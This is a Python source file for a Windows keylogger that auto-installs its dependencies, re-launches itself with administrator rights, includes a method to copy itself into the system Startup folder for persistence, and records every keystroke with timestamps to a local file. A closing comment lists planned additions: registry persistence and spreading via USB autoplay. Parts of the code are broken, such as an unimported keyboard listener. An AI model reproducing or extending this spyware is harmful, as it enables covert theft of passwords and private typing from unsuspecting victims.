import subprocess
import os
import sys
import shutil
requiredModules = ["pynput", "datetime", "pyuac"]

for module in requiredModules:
    try:
        __import__(module)
    except ModuleNotFoundError:
        subprocess.run(["pip", "install", module])

from datetime import datetime
import pyuac


class Keylogger:

    def __init__(self):
        self.log = "Keylogger started ..."

    # this are primary methods which should be done
    def addToStartup(self):
        try:
            startupFolder = os.path.join(os.getenv("ProgramData"), "Microsoft", "Windows",
                                         "Start Menu", "Programs", "Startup")
            exePath = os.path.abspath(sys.argv[0])
            shutil.move(exePath, os.path.join(startupFolder, os.path.basename(sys.argv[0])))
        except Exception as e:
            print("error in moving .exe to startup")
            print(e)

    # This are easy methods to understand

    def saveLogToFile(self, log):
        with open("keylog.txt", "a") as file:
            file.write(log)
            file.close()

    def saveData(self, key):
        try:
            currentKey = str(key.char) 
        except AttributeError:
            if key == key.space:
                currentKey = "SPACE" 
            elif key == key.esc:
                currentKey = "ESC" 
            else:
                currentKey = " " + str(key) + " "

        currentTime = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
        log = currentTime + " -> " + currentKey + "\n"
        self.saveLogToFile(log)

    def run(self):

        with keyboard.Listener(on_press=self.saveData) as keyboardListener:
            keyboardListener.join()





if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        print("Re-launching as admin!")
        try:
            pyuac.runAsAdmin()
        except Exception as e:
            try:
                pyuac.runAsAdmin()
            except:
                pass

    obj = Keylogger()
    obj.run()
        
































"""
--> tasks which I should do now 
    
    - the script should move to registry of windows

    - also for pendrive just research about autoplay and python code 
      to on that also


"""


